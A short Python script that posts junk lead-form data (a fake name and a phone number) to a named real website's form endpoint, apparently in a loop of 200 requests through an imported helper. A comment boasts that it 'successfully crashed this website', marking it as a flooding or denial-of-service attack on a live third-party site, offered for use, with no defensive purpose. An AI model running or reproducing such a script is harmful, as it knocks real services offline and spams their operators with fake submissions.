from function import main
import requests

# -----------------------------------------------------  SUCCESSFULLY CRASHED THIS WEBSITE! 1x! ----------------------------------------------

url = 'https://themainhealth.com/blackbox/send.php'

data = {
    "Lead[app_dir]": "/lycium-halosphere-ph4/ph",
    "Lead[name]": "asdfasdf",
    "Lead[phone]": "09454445252",
    "Lead[agreement]": "on"
}

main(url, data, 200)
